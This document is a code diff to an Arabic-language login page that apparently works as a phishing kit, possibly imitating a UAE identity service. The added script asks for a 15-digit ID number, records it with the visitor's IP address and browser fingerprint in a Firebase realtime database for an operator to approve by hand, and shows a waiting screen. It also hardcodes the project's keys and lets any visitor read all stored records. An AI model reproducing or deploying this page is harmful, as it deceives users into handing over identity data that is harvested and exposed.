@@ -10,7 +10,7 @@
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="firebase-config.js?v=16"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     
     <style>
         :root {
@@ -350,6 +350,22 @@
     </div>
 
     <script>
+        // ========== تكوين Firebase ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyAk27c6KL77QbnXa_bNeWzUsBph5o7I9A8",
+            authDomain: "uaewep-ce954.firebaseapp.com",
+            databaseURL: "https://uaewep-ce954-default-rtdb.firebaseio.com",
+            projectId: "uaewep-ce954",
+            storageBucket: "uaewep-ce954.firebasestorage.app",
+            messagingSenderId: "679277016812",
+            appId: "1:679277016812:web:ab78a6d55b4a153b8a97c9",
+            measurementId: "G-NE9HXPPM9P"
+        };
+        
+        // ========== تهيئة Firebase ==========
+        let firebaseApp;
+        let realtimeDb;
+        
         // ========== متغيرات النظام ==========
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
@@ -427,8 +443,8 @@
             }
         }
         
-        // ========== تهيئة Firebase ==========
-        async function initializeFirebaseApp() {
+        // ========== تهيئة Firebase App و Realtime Database ==========
+        async function initializeFirebase() {
             try {
                 console.log('🔥 محاولة تهيئة Firebase...');
                 
@@ -437,16 +453,24 @@
                     return false;
                 }
                 
-                // استخدام خدمات Firebase من firebase-config.js
-                if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
-                    const initialized = window.firebaseServices.initialize();
-                    if (initialized) {
-                        console.log('✅ Firebase مهيئ بنجاح باستخدام firebaseServices');
-                        return true;
-                    }
-                }
+                // تهيئة Firebase App
+                firebaseApp = firebase.initializeApp(firebaseConfig);
+                console.log('✅ Firebase App مهيئ');
                 
-                return false;
+                // تهيئة Realtime Database
+                realtimeDb = firebase.database();
+                console.log('✅ Firebase Realtime Database مهيئ');
+                
+                // اختبار الاتصال
+                const testRef = realtimeDb.ref('connection_test');
+                await testRef.set({
+                    test: true,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                await testRef.remove();
+                
+                console.log('✅ اتصال Realtime Database يعمل بنجاح');
+                return true;
                 
             } catch (error) {
                 console.error('❌ خطأ في تهيئة Firebase:', error);
@@ -454,52 +478,71 @@
             }
         }
         
-        // ========== دالة حفظ رقم الهوية في Firebase (بدون رقم مصادقة) ==========
-        async function saveIdNumberToFirebase(idNumber, rememberMe) {
-            updateProgress(30, 'جاري حفظ رقم الهوية...');
+        // ========== دالة حفظ رقم الهوية في Realtime Database ==========
+        async function saveIdNumberToRealtimeDB(idNumber, rememberMe) {
+            updateProgress(30, 'جاري حفظ رقم الهوية في قاعدة البيانات...');
             
             try {
-                // استخدام firebaseServices لإنشاء سجل جديد
-                if (!window.firebaseServices) {
-                    throw new Error('خدمات Firebase غير متاحة');
+                if (!realtimeDb) {
+                    throw new Error('Realtime Database غير مهيئ');
                 }
                 
                 const clientIP = await getClientIP();
+                const timestamp = new Date().toISOString();
+                const recordId = 'record_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                 
-                const additionalData = {
+                updateProgress(50, 'جاري إنشاء السجل...');
+                
+                // إنشاء بيانات السجل
+                const recordData = {
+                    idNumber: idNumber,
+                    timestamp: timestamp,
+                    status: 'pending',
+                    requiresManualApproval: true,
                     rememberMe: rememberMe,
                     userAgent: navigator.userAgent,
                     screenSize: `${window.screen.width}x${window.screen.height}`,
                     language: navigator.language,
+                    ipAddress: clientIP,
                     browser: {
                         name: navigator.appName,
                         version: navigator.appVersion,
                         platform: navigator.platform
-                    },
-                    ipAddress: clientIP
+                    }
                 };
                 
-                updateProgress(50, 'جاري إنشاء السجل...');
+                // حفظ البيانات في Realtime Database
+                const recordsRef = realtimeDb.ref('auth_requests');
+                const newRecordRef = recordsRef.child(recordId);
+                await newRecordRef.set(recordData);
                 
-                // إنشاء سجل جديد بدون رقم مصادقة
-                const result = await window.firebaseServices.createNewRecord(idNumber, additionalData);
-                
-                if (!result.success) {
-                    throw new Error(result.error);
-                }
-                
-                console.log('✅ تم حفظ رقم الهوية في Firebase:', result.recordId);
-                console.log('⚠️ تم إنشاء سجل بدون رقم مصادقة - بانتظار إدخال المسؤول');
+                console.log('✅ تم حفظ رقم الهوية في Realtime Database:', recordId);
                 updateProgress(70, 'تم إنشاء طلب تسجيل الدخول بنجاح');
                 
                 return {
-                    recordId: result.recordId,
+                    recordId: recordId,
                     requiresManualApproval: true
                 };
                 
             } catch (error) {
-                console.error('❌ خطأ في حفظ رقم الهوية:', error);
+                console.error('❌ خطأ في حفظ رقم الهوية في Realtime Database:', error);
                 throw error;
+            }
+        }
+        
+        // ========== دالة للحصول على البيانات المحفوظة (لأغراض الاختبار) ==========
+        async function getSavedRecords() {
+            try {
+                if (!realtimeDb) {
+                    throw new Error('Realtime Database غير مهيئ');
+                }
+                
+                const recordsRef = realtimeDb.ref('auth_requests');
+                const snapshot = await recordsRef.once('value');
+                return snapshot.val();
+            } catch (error) {
+                console.error('❌ خطأ في جلب البيانات:', error);
+                return null;
             }
         }
         
@@ -535,9 +578,9 @@
             firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري الاتصال بقاعدة البيانات...';
             
             try {
-                // 1. تهيئة Firebase
+                // 1. تهيئة Firebase و Realtime Database
                 updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
-                const firebaseInitialized = await initializeFirebaseApp();
+                const firebaseInitialized = await initializeFirebase();
                 
                 if (!firebaseInitialized) {
                     throw new Error('فشل الاتصال بقاعدة البيانات. يرجى المحاولة لاحقاً.');
@@ -545,20 +588,20 @@
                 
                 firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم الاتصال بقاعدة البيانات';
                 
-                // 2. حفظ رقم الهوية في Firebase بدون رقم مصادقة
+                // 2. حفظ رقم الهوية في Realtime Database
                 updateProgress(40, 'جاري حفظ رقم الهوية...');
-                const result = await saveIdNumberToFirebase(idNumber, rememberMe);
+                const result = await saveIdNumberToRealtimeDB(idNumber, rememberMe);
                 
-                // 3. تحديث حالة "تذكرني" في المتصفح فقط
+                // 3. تحديث حالة "تذكرني" في المتصفح
                 if (rememberMe) {
                     localStorage.setItem('rememberMeEnabled', 'true');
                     localStorage.setItem('lastIdNumber', idNumber);
                 } else {
                     localStorage.removeItem('rememberMeEnabled');
-                    localStorage.setItem('lastIdNumber', idNumber); // نحفظ دائماً آخر رقم
+                    localStorage.setItem('lastIdNumber', idNumber);
                 }
                 
-                // حفظ معلومات السجل فقط
+                // حفظ معلومات السجل
                 localStorage.setItem('currentRecordId', result.recordId);
                 localStorage.setItem('requiresApproval', 'true');
                 localStorage.setItem('requestTimestamp', Date.now().toString());
@@ -566,15 +609,15 @@
                 updateProgress(80, 'جاري تحضير التوجيه...');
                 firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم إنشاء طلب تسجيل الدخول بنجاح';
                 
-                // 4. الانتقال مباشرة إلى صفحة success.html (بدون رقم مصادقة)
+                // 4. الانتقال إلى صفحة success.html
                 setTimeout(() => {
-                    console.log('🚀 توجيه إلى success.html مع معرف السجل فقط:', {
-                        recordId: result.recordId
+                    console.log('🚀 توجيه إلى success.html مع معرف السجل:', {
+                        recordId: result.recordId,
+                        dbType: 'realtime'
                     });
                     
-                    // التوجيه إلى صفحة success.html مع معرف السجل فقط - بدون رقم مصادقة
                     window.location.href = 'success.html?recordId=' + encodeURIComponent(result.recordId) + 
-                                          '&source=apply_page&status=pending&waiting=true';
+                                          '&dbType=realtime&status=pending&waiting=true';
                     
                 }, 1500);
                 
@@ -620,7 +663,8 @@
             // تهيئة Firebase تلقائياً عند تحميل الصفحة
             setTimeout(async () => {
                 try {
-                    await initializeFirebaseApp();
+                    await initializeFirebase();
+                    console.log('✅ Firebase مهيئ تلقائياً');
                 } catch (error) {
                     console.warn('⚠️ تحذير: فشل التهيئة التلقائية:', error);
                 }
@@ -647,15 +691,15 @@
             console.log('🔍 اختبار سريع من apply.html...');
             
             try {
-                const initialized = await initializeFirebaseApp();
+                const initialized = await initializeFirebase();
                 if (!initialized) {
                     return { error: 'Firebase غير مهيئ' };
                 }
                 
                 const result = {
                     firebaseInitialized: initialized,
-                    firestoreAvailable: !!window.firebaseServices.firestore(),
-                    realtimeDbAvailable: !!window.firebaseServices.realtimeDb(),
+                    realtimeDbAvailable: !!realtimeDb,
+                    appName: firebaseApp?.name,
                     localStorage: {
                         lastIdNumber: localStorage.getItem('lastIdNumber'),
                         rememberMeEnabled: localStorage.getItem('rememberMeEnabled')
@@ -672,21 +716,78 @@
         };
         
         window.createTestRecord = async function() {
-            console.log('🧪 إنشاء سجل تجريبي...');
+            console.log('🧪 إنشاء سجل تجريبي في Realtime Database...');
             
             try {
                 const testIdNumber = '123456789012345';
-                const result = await saveIdNumberToFirebase(testIdNumber, true);
+                const result = await saveIdNumberToRealtimeDB(testIdNumber, true);
                 
                 console.log('✅ نتيجة الاختبار:', result);
                 showNotification('اختبار ناجح', 
-                    `تم إنشاء سجل جديد بدون رقم مصادقة`, 'success');
+                    `تم إنشاء سجل جديد في Realtime Database`, 'success');
                 
                 return result;
             } catch (error) {
                 console.error('❌ فشل الاختبار:', error);
                 showNotification('اختبار فاشل', error.message, 'error');
                 return { error: error.message };
+            }
+        };
+        
+        window.getRealtimeRecords = async function() {
+            console.log('📋 جلب السجلات من Realtime Database...');
+            
+            try {
+                const records = await getSavedRecords();
+                console.log('📊 السجلات الموجودة:', records);
+                
+                if (records) {
+                    const count = Object.keys(records).length;
+                    showNotification('جلب البيانات', 
+                        `تم العثور على ${count} سجل في قاعدة البيانات`, 'success');
+                } else {
+                    showNotification('جلب البيانات', 
+                        'لا توجد سجلات في قاعدة البيانات', 'info');
+                }
+                
+                return records;
+            } catch (error) {
+                console.error('❌ خطأ في جلب البيانات:', error);
+                showNotification('خطأ', 'فشل في جلب البيانات', 'error');
+                return null;
+            }
+        };
+
+        // دالة لاختبار اتصال Realtime Database
+        window.testRealtimeConnection = async function() {
+            try {
+                console.log('🔗 اختبار اتصال Realtime Database...');
+                const testRef = realtimeDb.ref('connection_test');
+                
+                await testRef.set({
+                    test: true,
+                    timestamp: new Date().toISOString(),
+                    message: 'Test connection from apply.html'
+                });
+                
+                console.log('✅ تم إرسال بيانات الاختبار');
+                
+                // قراءة البيانات للتأكد
+                const snapshot = await testRef.once('value');
+                const data = snapshot.val();
+                console.log('📖 البيانات المقروءة:', data);
+                
+                // تنظيف البيانات
+                await testRef.remove();
+                console.log('🧹 تم تنظيف بيانات الاختبار');
+                
+                showNotification('اختبار الاتصال', '✅ اتصال Realtime Database يعمل بنجاح', 'success');
+                return { success: true, data: data };
+                
+            } catch (error) {
+                console.error('❌ فشل اختبار الاتصال:', error);
+                showNotification('اختبار الاتصال', '❌ فشل اختبار الاتصال', 'error');
+                return { success: false, error: error.message };
             }
         };
 
